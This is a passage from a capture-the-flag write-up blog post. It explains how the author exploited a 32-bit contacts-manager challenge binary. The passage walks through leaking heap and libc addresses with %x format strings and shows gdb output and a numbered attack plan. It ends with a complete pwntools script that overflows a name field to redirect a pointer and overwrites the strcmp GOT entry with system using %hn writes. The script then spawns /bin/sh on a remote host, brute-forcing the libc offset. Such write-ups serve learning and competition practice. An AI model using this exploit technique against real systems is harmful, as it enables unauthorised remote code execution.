<p>So now the question is, how do we put this all together? Well for starters, we don’t have any calls to <code class="highlighter-rouge">system</code> or <code class="highlighter-rouge">execve</code> which would give us a shell on the system so that means we would need either a libc leak (by reading from a GOT pointer) or guessing the libc that the challenge is using. During the competition we exfiltrated the libc binary from the challenge, precision (for a 32 bit libc it is located here <code class="highlighter-rouge">/lib/i386-linux-gnu/libc.so.6</code>). And dropping this libc in IDA we can find out where <code class="highlighter-rouge">system</code> is relative to whatever we decide to leak.</p>

<p>But we are still left with the problem of leaking some sort of address located in libc that we can apply some offset to to find the address of libc.</p>

<p>Well we do have a write primitive with our format string so let’s see if that gives us anything interesting…</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Menu:
1<span class="o">)</span>Create contact
2<span class="o">)</span>Remove contact
3<span class="o">)</span>Edit contact
4<span class="o">)</span>Display contacts
5<span class="o">)</span>Exit
<span class="gp">&gt;&gt;&gt; </span>1
Contact info:
    Name: A
<span class="o">[</span>DEBUG] Haven<span class="s1">'t written a parser for phone numbers; You have 10 numbers
    Enter Phone No: A
    Length of description: 100
    Enter description:
        %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 4
Contacts:
    Name: A
    Length 100
    Phone #: A
    Description: 8f3a008.f7614971.f776cff4.0.0.fffc5b08.8048c99.804b0a8.64.8f3a008.8f3a018</span></code></pre></figure>

<p>The second address looks pretty interesting, I wonder what it resolves to:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">gdb</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">5</span><span class="n">i</span> <span class="n">f7e6c971</span>
   <span class="mh">0xf7e6c971</span> <span class="o">&lt;</span><span class="n">_IO_vfscanf</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;:</span>    <span class="k">add</span>    <span class="n">ebx</span><span class="p">,</span><span class="mh">0x158683</span>
   <span class="mh">0xf7e6c977</span> <span class="o">&lt;</span><span class="n">_IO_vfscanf</span><span class="o">+</span><span class="mi">23</span><span class="o">&gt;:</span> <span class="k">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x22c</span>
   <span class="mh">0xf7e6c97d</span> <span class="o">&lt;</span><span class="n">_IO_vfscanf</span><span class="o">+</span><span class="mi">29</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">esi</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span>
   <span class="mh">0xf7e6c980</span> <span class="o">&lt;</span><span class="n">_IO_vfscanf</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x1b0</span><span class="err">]</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0xf7e6c986</span> <span class="o">&lt;</span><span class="n">_IO_vfscanf</span><span class="o">+</span><span class="mi">38</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="err">]</span></code></pre></figure>

<p>Too easy. So we can find the offset between <code class="highlighter-rouge">_IO_vfscanf+17</code> and <code class="highlighter-rouge">system</code> (actually making this writeup I realized that I fucked up the offset, I found the offset from <code class="highlighter-rouge">_IO_vfscanf</code> to <code class="highlighter-rouge">system</code> forgetting to subtract 17 from the offset :c. I got really frusted that it wasn’t working so I bruteforced the offset and after 17 iterations it worked lol :3).</p>

<p>Also to cover all components of the exploit, the first address that we read off the stack in the format string <code class="highlighter-rouge">0x8f3a008</code> is actually the address of our phone number pointer which we know to be a heap address. Based on this address, we can actually determine where all other allocations will be made (by using a debugger and finding where things are allocated relative to our first phone number allocation).</p>

<p>What is interesting is that with our name overflow, we can actually overflow the phone number pointer and cause it to become any pointer that we want. For example, it could be the GOT address of <code class="highlighter-rouge">strcmp</code> for example ;D</p>

<p>If we look at <code class="highlighter-rouge">edit_contact</code>, we see that it is using <code class="highlighter-rouge">strcmp</code> to compare our inputed name to the names that it knows of:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">A04</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; s2</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">A08</span>                 <span class="k">lea</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">s</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">A0B</span>                 <span class="k">mov</span>     <span class="p">[esp],</span> <span class="n">eax</span>      <span class="c">; s1</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">A0E</span>                 <span class="k">call</span>    <span class="n">_strcmp</span></code></pre></figure>

<p>So this code will turn from:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">strcmp</span><span class="p">(</span><span class="n">our_stuff</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span></code></pre></figure>

<p>to</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">system</span><span class="p">(</span><span class="n">our_stuff</span><span class="p">)</span></code></pre></figure>

<p>With the phone number pointer being on the stack at the time of our format string vuln, we can have an arbiturary write to anywhere in the program by just changing the phone number pointer in our overflow :3</p>

<p>So our approach now becomes:</p>

<ol>
  <li>Create the first person</li>
  <li>Set their name and phone number to be anything</li>
  <li>Set their description to be “%x.%x”</li>
  <li>Print out the contact</li>
  <li>Using the leaked phone number allocation and leaked <code class="highlighter-rouge">_IO_vprintf</code> address calculate all the addresses we need to have</li>
  <li>Create a second person</li>
  <li>Set their name and number to be anything</li>
  <li>Set their description to be a format string payload to overwrite the lower part of the <code class="highlighter-rouge">strcmp</code> GOT address with the lower part of our <code class="highlighter-rouge">system</code> address</li>
  <li>Change the first person’s name to overflow into the phone number, changing it to be the <code class="highlighter-rouge">strcmp</code> GOT address making sure to keep the second person’s description pointer intact (since we will be overflowing it too, and we need to the pointer to keep pointing to our format string payload)</li>
  <li>Create a third person</li>
  <li>Set their name and number to be anything</li>
  <li>Set their description to be a format string payload to overwrite the upper part of the <code class="highlighter-rouge">strcmp</code> GOT address with the upper part of our <code class="highlighter-rouge">system</code> address</li>
  <li>Change the second person’s name to overflow into the phone number, changing it to be the <code class="highlighter-rouge">strcmp</code> GOT address making sure to keep the third person’s description pointer intact</li>
  <li>Print out the contacts, overwriting the <code class="highlighter-rouge">strcmp</code> GOT with our <code class="highlighter-rouge">system</code> address</li>
  <li>Edit the contact named “/bin/sh”</li>
  <li>Get shell &lt;3</li>
</ol>

<p>Here is the exploit script (<a href="http://pwntools.readthedocs.org">pwntools is &lt;3</a>):</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c"># context.log_level = 'debug'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"contacts"</span><span class="p">)</span>
<span class="n">strcmp_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"strcmp"</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">format_string</span><span class="p">(</span><span class="n">write_address</span><span class="p">):</span>
    <span class="n">part1</span> <span class="o">=</span> <span class="n">write_address</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
    <span class="n">part2</span> <span class="o">=</span> <span class="p">(</span><span class="n">write_address</span> <span class="o">&amp;</span> <span class="mh">0xffff0000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
    <span class="s">'''
    if part1 &gt; part2:
        tmp = part1
        part1 = part2
        part2 = tmp
    '''</span>
    <span class="n">format_str1</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">{0}x</span><span class="si">%1</span><span class="s">$hn"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">part1</span><span class="p">)</span>
    <span class="n">format_str2</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">{0}x</span><span class="si">%1</span><span class="s">$hn"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">part2</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">format_str1</span><span class="p">,</span> <span class="n">format_str2</span>

<span class="k">def</span> <span class="nf">create_contact</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">phone</span><span class="p">,</span> <span class="n">desc</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">phone</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">desc</span><span class="p">)))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">desc</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Menu:"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit_contact</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">person</span><span class="p">,</span> <span class="n">num</span><span class="p">,</span> <span class="n">change</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">person</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">change</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Menu:"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">display_contacts</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Menu:"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">do_sploit</span><span class="p">(</span><span class="n">offset</span><span class="p">):</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"54.165.223.128"</span><span class="p">,</span> <span class="mi">2555</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt;&gt;"</span><span class="p">)</span>

    <span class="n">p1</span> <span class="o">=</span> <span class="s">"AAAA"</span>
    <span class="n">p2</span> <span class="o">=</span> <span class="s">"BBBB"</span>
    <span class="n">p3</span> <span class="o">=</span> <span class="s">"CCCC"</span>

    <span class="c"># Create person 1</span>
    <span class="n">create_contact</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"</span><span class="si">%</span><span class="s">x.</span><span class="si">%</span><span class="s">x"</span><span class="p">)</span>

    <span class="n">leak</span> <span class="o">=</span> <span class="n">display_contacts</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="n">found</span> <span class="o">=</span> <span class="n">leak</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"Description: "</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="s">"Description: "</span><span class="p">)</span>
    <span class="n">bin_sh</span><span class="p">,</span> <span class="n">vfscanf_libc</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">16</span><span class="p">),</span> <span class="n">leak</span><span class="p">[</span><span class="n">found</span><span class="p">:</span><span class="n">found</span><span class="o">+</span><span class="mi">16</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">))</span>
    <span class="n">vfscanf_libc</span> <span class="o">-=</span> <span class="mi">17</span>

    <span class="k">print</span> <span class="s">"[+] /bin/sh is @ "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">),</span> <span class="s">": [+] _io_vfscanf libc is @ "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">vfscanf_libc</span><span class="p">)</span>

    <span class="n">system_libc</span> <span class="o">=</span> <span class="n">vfscanf_libc</span> <span class="o">+</span> <span class="n">offset</span>
    <span class="n">format1</span><span class="p">,</span> <span class="n">format2</span> <span class="o">=</span> <span class="n">format_string</span><span class="p">(</span><span class="n">system_libc</span><span class="p">)</span>

    <span class="k">print</span> <span class="s">"[+] system libc is @ "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_libc</span><span class="p">)</span>

    <span class="n">sec_person_desc</span> <span class="o">=</span> <span class="n">bin_sh</span> <span class="o">+</span> <span class="mh">0x30</span>
    <span class="k">print</span> <span class="s">"[+] Second person's description @ "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">sec_person_desc</span><span class="p">)</span>

    <span class="n">trd_person_desc</span> <span class="o">=</span> <span class="n">bin_sh</span> <span class="o">+</span> <span class="mh">0x58</span>
    <span class="k">print</span> <span class="s">"[+] Third person's description @ "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">trd_person_desc</span><span class="p">)</span>

    <span class="c"># Create person 2</span>
    <span class="n">create_contact</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="s">"1234"</span><span class="p">,</span> <span class="n">format1</span><span class="p">)</span>

    <span class="c"># Overflow person 1 name into person 2 phone pointer</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x69</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">64</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sec_person_desc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">strcmp_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p2</span>
    <span class="n">edit_contact</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="c"># Create person 3</span>
    <span class="n">create_contact</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">p3</span><span class="p">,</span> <span class="s">"5678"</span><span class="p">,</span> <span class="n">format2</span><span class="p">)</span>

    <span class="c"># Overflow person 2 name into person 3 desc pointer</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x42</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">64</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">trd_person_desc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">strcmp_got</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
    <span class="n">edit_contact</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="c"># Display</span>
    <span class="c"># Triggers format string vuln to overwrite strcmp with system (when printing person 2)</span>
    <span class="c"># Calls system by having desc pointer overwritten in person 3's desc</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">display_contacts</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">return</span>

    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span>
    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"ls"</span><span class="p">)</span>
        <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
        <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">return</span>

<span class="n">libc_so_6_off</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0xd060</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">):</span>
    <span class="n">do_sploit</span><span class="p">(</span><span class="n">libc_so_6_off</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span></code></pre></figure>


  </div>

</article>

        </div>
      </div>

      <footer class="site-footer">
  <div class="wrapper">
    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <div class="social-media-list">
          
            <a href="mailto:chris@vgcs.io">Email</a>
          

          
            <a href="https://github.com/breadchris">Github</a>
          

          
            <a href="https://twitter.com/breadchris">Twitter</a>
          
        </div>
      </div>

      <div class="footer-col footer-col-2">
        <p>Theme made by <a href="http://masha.space/">Masha Safina</a>. Codes available on <a href="https://github.com/mashlo/captains-log">GitHub</a> 🖖</p>
      </div>
    </div>
  </div>
</footer>

    </div>
  </body>

</html>
